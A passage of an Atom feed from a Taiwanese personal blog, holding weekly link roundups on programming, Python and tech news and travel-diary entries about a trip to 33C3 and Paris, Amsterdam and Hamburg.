&lt;li&gt;好麻煩喔 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://thejunkland.com/blog/how-to-write-good-readme.html"&gt;How to write good README and why should you care&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Your project's README tells a lot about your project. How to make sure it's as good as your great project deserves?  I've struggled with writing READMEs for my projects from the day I started to learn developing.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;這篇文章詳細描述了該怎麼寫出一個好的 README，覺得很值得參考。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://pymotw.com/3/tabnanny/"&gt;tabnanny — Indentation validator — PyMOTW 3&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來 Python 3 就有 built-in module 可以拿來檢查縮排了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;tensorflow&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://kevinhughes.ca/blog/tensor-kart"&gt;TensorKart: self-driving MarioKart with TensorFlow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This winter break, I decided to try and finish a project I started a few years ago: training an artificial neural network to play MarioKart 64.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;用 TensorFlow 玩馬力歐賽車  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;vim&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://unix.stackexchange.com/questions/30665/gvim-p-limit-of-opened-tabs"&gt;command line - gvim -p limit of opened tabs? - Unix &amp;amp; Linux Stack Exchange&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;It feels, like a kind of tab limit?  How to make gvim -p ... to open all files without need of opening those above limit manually with :tabnew ?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;set tabpagemax=100&lt;/code&gt; into vimrc.  &lt;ul&gt;
&lt;li&gt;default is 10.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.wildsky.cc/posts/transplant-content-farm-blocker/"&gt;移植「封鎖內容農場」套件 | Wildsky's wild sky&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;竟然有這麼棒的套件  &lt;/li&gt;
&lt;li&gt;好像該來裝一下  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2016/12/25/7045/%e9%98%bb%e6%93%8b%e5%bb%a3%e5%91%8a%e7%9a%84%e6%94%bb%e6%80%a7%e9%98%b2%e5%a3%81-adnauseam/"&gt;阻擋廣告的攻性防壁 AdNauseam | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「改自 uBlock Origin，除了本來的隱藏廣告功能外，還會狂點廣告來亂」LOL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://pansci.asia/archives/111893"&gt;女性為何會有性高潮？性高潮之謎有新解 - PanSci 泛科學&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;哇 這篇好專業啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=yrU6FqTUxH8"&gt;2016/12/25 壹電視新聞台 陳雅琳「探秘北韓」特別報導（下） - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看完以後真的覺得台灣很多人搞不好願意搬去北韓住  &lt;/li&gt;
&lt;li&gt;尤其是對兩蔣統治時代無法忘懷的人  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=jOJup2foLsw"&gt;2016/12/18 壹電視新聞台 陳雅琳「探秘北韓」特別報導（上） - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;挺有趣的  &lt;/li&gt;
&lt;li&gt;不知不覺就看完了上集  &lt;/li&gt;
&lt;li&gt;來看下集  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tylercottenie.wordpress.com/2017/01/05/%e5%8f%b0%e7%81%a3%e7%9a%84%e9%9b%a3%e6%8a%b5%e6%a5%b5/"&gt;台灣的難抵極 | tylercottenie&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個外國人實在是太認真了  &lt;/li&gt;
&lt;li&gt;看了這篇才知道有 Poles of Inaccessibility 這個專有名詞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://18taxi.blogspot.tw/2016/06/uber-vs-taxi.html"&gt;運轉手的筆記本: UBER vs TAXI 開箱文&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「每位 Uber 司機都清楚，如果評價低於4.6星，將會被召回檢討，素行不良可能就不能再擔任司機了」  &lt;/li&gt;
&lt;li&gt;還有很多很棒很詳細的比較都寫在裡頭  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;joke&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.osnews.com/story/19266/WTFs_m"&gt;WTFs/m&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;軟體工程師的笑話，用 WTF 出現的次數來表示程式碼的品質。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="ai"></category><category term="blog"></category><category term="cli"></category><category term="csnews"></category><category term="gcp"></category><category term="git"></category><category term="github"></category><category term="java"></category><category term="joke"></category><category term="linux"></category><category term="macos"></category><category term="programming"></category><category term="python"></category><category term="taiwan"></category><category term="tensorflow"></category><category term="trivia"></category><category term="vim"></category><category term="web"></category></entry><entry><title>Y2017W01</title><link href="https://blog.m157q.tw/posts/2017/01/09/y2017w01/" rel="alternate"></link><published>2017-02-06T03:14:33+08:00</published><updated>2017-02-06T03:14:33+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-01-09:posts/2017/01/09/y2017w01/</id><summary type="html">&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.fntsr.tw/articles/2016/12/21/generate-google-drive-dropbox-onedrive-directly-download-link/"&gt;獲取 Google Drive, Dropbox, OneDrive 中檔案直接下載的連結 - 深藏若虛&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「筆者現在工作場所連接影印機的電腦仍是 Windows XP 搭配 IE6，無法下載要影印的文件下來。」  &lt;/li&gt;
&lt;li&gt;感覺有了這篇文章的整理就可以寫個 script 解決這件事啦  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cs&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/ccckmit/ss-70707797"&gt;《計算機結構與作業系統裡》-- 資工系學生們經常搞錯的那些事兒！&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是釐清了一些自己沒懂的部份  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;javascript&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ryanmcdermott/clean-code-javascript"&gt;GitHub - ryanmcdermott/clean-code-javascript: Clean Code concepts adapted for JavaScript&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;JavaScript 版本的 Clean Code  &lt;/li&gt;
&lt;li&gt;分享給寫 JavaScript 的同事之後，他說這篇真的還挺不錯的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;job&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/gossiping/M.1483435954.A.307.html"&gt;[新聞] 【獨家】翟本喬公司員工爆 年前大裁員 - 看板 Gossiping - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「員工透露，公司疑似因周轉不靈、錢進不來，幾乎要倒閉，所以才會在農曆年前突然大規模裁員，人數將近8成，全公司大約110至120人左右，裁員後，將只剩下2個核心小組成員。」  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/denny.ku1/posts/1226657567387696"&gt;Denny Ku - 最近新聞提到我之前任職的公司和沛科技年前裁員，網路上有各種說法都跑出來，... | Facebook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「落井下石很容易，但在這個時代失敗和成功都是暫時的。」  &lt;/li&gt;
&lt;li&gt;簡單來說就是跟酸民認真就輸了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackshare.io/posts/top-developer-tools-2016"&gt;The Top 50 Developer Tools of 2016 | StackShare&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;總共分成五類，各取了前十名。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.pythonlearn.com/index.php"&gt;Python for Everybody: Exploring Data in Python 3&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/naftaliharris/placeholder"&gt;GitHub - naftaliharris/placeholder: Fork of Python 2.7 with new syntax, builtins, and libraries backported from Python 3.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;本來叫 Python 2.8 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pypa/pipfile"&gt;GitHub - pypa/pipfile&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;a new (and much better!) replacement for the existing standard pip's requirements.txt file.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/grumpy"&gt;GitHub - google/grumpy: Grumpy is a Python to Go source code transcompiler and runtime.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Grumpy is a Python to Go source code transcompiler and runtime that is intended to be a near drop in replacement for CPython. The key difference is that it compiles Python source code to Go source code which is then compiled to native code, rather than to bytecode. This means that Grumpy has no VM.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;沒錯，就是字面上的意思，人只要寫 Python 再用 Grumpy 幫你轉成 golang，一切都是為了效能啊  &lt;/li&gt;
&lt;li&gt;不過目前仍然還沒有很成熟，加上有些限制。  &lt;ul&gt;
&lt;li&gt;不支援 &lt;code&gt;exec&lt;/code&gt;, &lt;code&gt;eval&lt;/code&gt;, &lt;code&gt;compile&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;不支援 C extension modules  &lt;/li&gt;
&lt;li&gt;還有許多預計會支援但目前還沒支援的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://opensource.googleblog.com/2017/01/grumpy-go-running-python.html"&gt;Google Open Source Blog: Grumpy: Go running Python!&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Grumpy is an experimental Python runtime for Go. It translates Python code into Go programs, and those transpiled programs run seamlessly within the Go runtime.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://bola.gov.taipei/ct.asp?xItem=94627869&amp;amp;ctNode=76327&amp;amp;mp=116003"&gt;臺北市政府勞動局 ─ 違反勞動基準法事業單位&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;台灣 Yahoo、台灣 Oracle、台灣大學、中央研究院上榜  OAO  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/photo.php?fbid=1720330024659355&amp;amp;set=a.150639711628402.36958.100000471228657&amp;amp;type=3&amp;amp;theater"&gt;葉丙成 - 【魂斗羅名字由來，你知否？】... | Facebook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「魂斗羅」三字的漢字日語發音是「コントラ」，也是它的英文名字 Contra 的日語發音。  &lt;/li&gt;
&lt;li&gt;Contras 是 1980 年代活躍於尼加拉瓜反桑定左翼政權的反革命游擊隊的稱呼。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=5K7cNWJfxMY"&gt;亞當潑冷水：電動車並沒有比較環保 - College Humor - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「如果你不留意，這些公司會利用你想幫助地球的想法，來賣你更多傷害地球的東西。購買綠能產品並不能解決問題，因為購買本身就是個問題。我們要降低購買的數量，並重複使用現有的東西。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=KsGiDrt5U2c"&gt;千禧世代在職場上到底出了什麼問題?  - Simon Sinek 賽門.西奈克 - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;身為千禧世代的一份子，我覺得這個訪談鞭辟入裡啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.mobile01.com/newsdetail/20372/ces-2017-honda-motorcycle-riding-assist-technology"&gt;[CES 2017快訊]重機會自己平衡了！Honda 本田發表全自體平衡技術 『Honda Riding Assist』 - Mobile01&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;哇賽 有點神  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="blog"></category><category term="conf"></category><category term="cs"></category><category term="javascript"></category><category term="job"></category><category term="life"></category><category term="misc"></category><category term="programmer"></category><category term="python"></category><category term="taiwan"></category><category term="trivia"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (14)</title><link href="https://blog.m157q.tw/posts/2017/01/02/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-14/" rel="alternate"></link><published>2017-01-15T01:13:59+08:00</published><updated>2017-01-15T01:13:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-01-02:posts/2017/01/02/33c3-暨歐洲法荷德聖誕跨年遊-14/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2017/01/01/33c3-暨歐洲法荷德聖誕跨年遊-13"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (13)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 14 2017/01/02 Sun&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;到北京的時候已經中午十二點多了  &lt;/li&gt;
&lt;li&gt;下午兩點多的飛機回台灣  &lt;/li&gt;
&lt;li&gt;安檢超嚴格，速度很慢。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;總結&lt;/h2&gt;
&lt;p&gt;論這次去的 3 個城市，&lt;br /&gt;
要我排名喜歡的程度的話就是，&lt;br /&gt;
阿姆斯特丹 &amp;gt; 漢堡 &amp;gt; 巴黎，&lt;br /&gt;
以下是個人對這 3 個城市的心得：  &lt;/p&gt;
&lt;h3&gt;巴黎&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;風景  &lt;ul&gt;
&lt;li&gt;到處都是塗鴉，只要是夠大的牆面都有。  &lt;/li&gt;
&lt;li&gt;人行道用來區隔用的柱子上也很多有的沒的小貼紙。  &lt;/li&gt;
&lt;li&gt;建築物真的很漂亮，真的就是美。  &lt;/li&gt;
&lt;li&gt;路面上到處都是隨手丟棄的煙蒂，抽菸的人真的非常的多，走在外面很常都在聞二手菸。  &lt;/li&gt;
&lt;li&gt;「巴黎的美，在昂首時。巴黎的醜，在俯首時。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;交通  &lt;ul&gt;
&lt;li&gt;重型機車超級多，隨便就停在路邊，大概像台灣的 125 那樣的地位吧。  &lt;ul&gt;
&lt;li&gt;前面有兩個輪子的三輪機車或四輪機車特別多，不知道有沒有啥特殊原因。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;行人會在紅燈但沒有車的情況下直接過馬路  &lt;/li&gt;
&lt;li&gt;很常聽到汽車駕駛按喇叭  &lt;/li&gt;
&lt;li&gt;個人覺得交通狀況跟台灣挺像的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其他  &lt;ul&gt;
&lt;li&gt;應該是因為巴黎恐攻以後，巴黎現在戒備非常森嚴，進入博物館或百貨公司基本上都需要通過安全檢查，檢查背包、過安檢門、金屬探測器搜身都有，所以建議隨身的東西不要帶太多，不然每次安檢都要花很多時間，會很麻煩。  &lt;ul&gt;
&lt;li&gt;我第二天開始就是因為這樣所以不帶背包出門了，而且不帶出門也不用怕扒手了，因為很冷所以基本上都會穿大衣，買件口袋多一點的大衣就很夠用了  &lt;/li&gt;
&lt;li&gt;女生的話帶個隨身的小包包裝些必要的東西就好。  &lt;/li&gt;
&lt;li&gt;但如果不嫌麻煩的話也沒差就是  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我怎著找都找不到萬神殿的明信片，不知道是不是有什麼原因不能販賣，還是我找的不夠仔細。  &lt;/li&gt;
&lt;li&gt;警察非常的忙碌，每天至少都會聽到 5 次以上的警笛聲吧，不誇張。  &lt;/li&gt;
&lt;li&gt;在巴黎會讓人有想減肥的衝動，因為路上看到的胖子真的不多。  &lt;/li&gt;
&lt;li&gt;除了想減肥以外，還會讓人想戴隱形眼鏡，因為路上戴眼鏡的人真的很少。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;阿姆斯特丹&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;食物  &lt;ul&gt;
&lt;li&gt;乳製品很便宜  &lt;ul&gt;
&lt;li&gt;一瓶一公升牛奶只要 0.9 歐，不到台幣三十塊。  &lt;/li&gt;
&lt;li&gt;起司也很便宜，一大塊只要兩歐左右。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;交通  &lt;ul&gt;
&lt;li&gt;荷蘭人真的超愛腳踏車  &lt;ul&gt;
&lt;li&gt;很多地方直接有一個車道就是腳踏車專用，寬度跟一般車子的車道一樣。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;風景  &lt;ul&gt;
&lt;li&gt;風真的好大  &lt;ul&gt;
&lt;li&gt;跟冬天新竹的風有過之而無不及  &lt;/li&gt;
&lt;li&gt;難怪可以這麼仰賴風力發電  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;漢堡&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;食物  &lt;ul&gt;
&lt;li&gt;牛奶比荷蘭更便宜  &lt;ul&gt;
&lt;li&gt;一公升脫脂牛奶最便宜的只要 0.6 歐，一公升全脂牛奶最便宜的只要 0.65 歐，比瓶裝水、氣泡水、可樂、RedBull 都還要便宜，好想住在這把牛奶當水喝啊！  &lt;ul&gt;
&lt;li&gt;後來發現好像是這家特別便宜，其他超市看到的至少都還是要 1 歐以上。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;超市的食物基本上是外面食物的半價左右，是個很適合像我這種窮遊人的好去處。  &lt;ul&gt;
&lt;li&gt;拿著台灣的收入來歐洲消費實在是很吃不消啊，以我這種收入不到年薪百萬的，在這邊應該算是窮人無誤。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;德國人好像超級不愛吃菜，外食幾乎沒什麼蔬菜，最多的大概就洋蔥。  &lt;ul&gt;
&lt;li&gt;便宜的食物有蔬菜的大概就只有來自土耳其的 Kebab 了。  &lt;/li&gt;
&lt;li&gt;一般的食物基本上都沒有，如果要加蔬菜的話價格大概都 5 歐開始起跳。  &lt;/li&gt;
&lt;li&gt;害我待在漢堡的第二天開始遭遇了人生中有史以來最嚴重的便祕，上完廁所擦屁股發現肛門撕裂流血的那種，但有便意的時候，大便還是瘋狂想出來但卻擠不過那道門，實在是讓我倍感痛苦，然後拉不乾淨的感覺真的讓人很火大。  &lt;/li&gt;
&lt;li&gt;想吃蔬菜的話去 Edeka Tamme 夾個自助式的生菜沙拉吧挺不錯的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;風景  &lt;ul&gt;
&lt;li&gt;漢堡是個海鷗比鴿子還多的港口城市  &lt;ul&gt;
&lt;li&gt;到處都可以看到海鷗在天空翱翔  &lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;街頭塗鴉也不少，但我還是覺得巴黎最多。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;交通  &lt;ul&gt;
&lt;li&gt;德國的車速普遍都滿快的  &lt;ul&gt;
&lt;li&gt;可能跟漢堡的路比較大條也有關係  &lt;/li&gt;
&lt;li&gt;即便是遠遠的也還是可以清楚的聽到汽車的引擎聲及感受到其速度  &lt;/li&gt;
&lt;li&gt;有次想像在巴黎那樣因為沒車所以闖行人紅燈，結果大概一百公尺外有台計程車，其引擎聲和速度直接讓我卻步乖乖等綠燈亮。  &lt;/li&gt;
&lt;li&gt;不愧是高速公路上限 150 km/hr 的國家  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但即便車速快，我看到的車都有守法。  &lt;ul&gt;
&lt;li&gt;車速很快的車子即便很靠近紅綠燈了，看到紅燈還是會停。  &lt;/li&gt;
&lt;li&gt;德國的車用紅綠燈和行人紅綠燈在車用紅綠燈轉成綠燈之前會有段時間都是紅燈，但我沒看到有駕駛因為知道之後就要轉綠燈而在這個時間搶快直接起步的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其他  &lt;ul&gt;
&lt;li&gt;遊民的數量我覺得比巴黎和阿姆斯特丹都還多  &lt;ul&gt;
&lt;li&gt;晚一點的話就可以看到有遊民直接睡在打烊的車站商店門口  &lt;/li&gt;
&lt;li&gt;橋下的湖邊的公園也看到好幾個常駐的帳篷  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;德國的玻璃容器與鋁製容器在購買的時候會多收一個退瓶費，要把瓶子拿去退瓶機回收，退瓶機通常都在超市內。  &lt;ul&gt;
&lt;li&gt;退瓶費在每個邦是不一樣的，依據各邦的法律而訂。  &lt;ul&gt;
&lt;li&gt;在漢堡似乎是玻璃類 0.15 歐、鋁製容器 0.25 歐。所以有些遊民會去翻垃圾桶，看有沒有人把這些容器丟在裏面，他就可以拿去回收換錢。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;退瓶機很酷，把瓶子放進去之後它會轉一圈掃標籤，確定是德國的產品的話就會成功回收，最後產生一張退瓶費的收據，讓你去超市櫃台換錢或是買東西的時候折抵。  &lt;ul&gt;
&lt;li&gt;底下則是可以放入整個裝滿瓶子的箱子退瓶，一次可以退 15 個瓶子的樣子，退瓶箱長的有點像啤酒箱。  &lt;/li&gt;
&lt;li&gt;結果 2017/01/02 回到台灣後，馬上看到台南也有了一台退瓶機的新聞。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Travel"></category><category term="Paris"></category><category term="Amsterdam"></category><category term="Hamburg"></category></entry><entry><title>Y2016W52</title><link href="https://blog.m157q.tw/posts/2017/01/02/y2016w52/" rel="alternate"></link><published>2017-02-06T02:57:17+08:00</published><updated>2017-02-06T02:57:17+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-01-02:posts/2017/01/02/y2016w52/</id><summary type="html">&lt;h3&gt;conf&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://hackaday.com/2016/12/30/33c3-works-for-me/"&gt;33C3: Works for Me | Hackaday&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The Chaos Communication Congress (CCC) is the largest German hacker convention by a wide margin, and it’s now in its thirty-third year, hence 33C3. The Congress is a techno-utopian-anarchist-rave with a social conscience and a strong underpinning of straight-up hacking.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;一篇詳細介紹 33C3 的文章，真的是個很棒的 conference。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;opensource&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://tonghuix.io/2016/12/diff-china-taiwan-osc/"&gt;两岸开源社群面面观（总结篇） – FOSS Geek | 爱开源魅影&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇也介紹的非常詳細，也很一針見血得點出了許多有關台灣開源社群可以改進和反省的部份，真的是篇值得一看的好文章。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA%3D%3D&amp;amp;mid=2650995135&amp;amp;idx=1&amp;amp;sn=758336ff3ecbfdc239d80a11a7122344&amp;amp;chksm=bdbf01ec8ac888fa1c24d310bb34ca257c4ba06e3d92a1d32d05803498e10624d0c525c1cc59&amp;amp;mpshare=1&amp;amp;scene=4&amp;amp;srcid=1229DBPu7JoSaH9bYLxIN3Ta#rd"&gt;左耳朵耗子：不灌鸡汤，说真的年龄渐长，技术人的发展之路该怎么走？&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;年底真的出現好多值得邊看邊自省的好文章啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jakevdp.github.io/blog/2014/05/09/why-python-is-slow/"&gt;Why Python is Slow: Looking Under the Hood&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;滿詳細介紹 Python 效能不好的一篇文章  &lt;/li&gt;
&lt;li&gt;但，沒有講到 GIL，沒錯，沒有講到 GIL，通常看到說 Python 效能差的文章，幾乎一定會講到 GIL，也可能是作者覺得這個已經講到爛掉了吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="conf"></category><category term="opensource"></category><category term="programmer"></category><category term="python"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (13)</title><link href="https://blog.m157q.tw/posts/2017/01/01/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-13/" rel="alternate"></link><published>2017-01-15T01:10:59+08:00</published><updated>2017-01-15T01:10:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-01-01:posts/2017/01/01/33c3-暨歐洲法荷德聖誕跨年遊-13/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/31/33c3-暨歐洲法荷德聖誕跨年遊-12"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (12)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 13 2017/01/01 Sat&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;法式午餐  &lt;/li&gt;
&lt;li&gt;聖母院周遭  &lt;/li&gt;
&lt;li&gt;心鎖橋  &lt;/li&gt;
&lt;li&gt;回旅館拿行李  &lt;/li&gt;
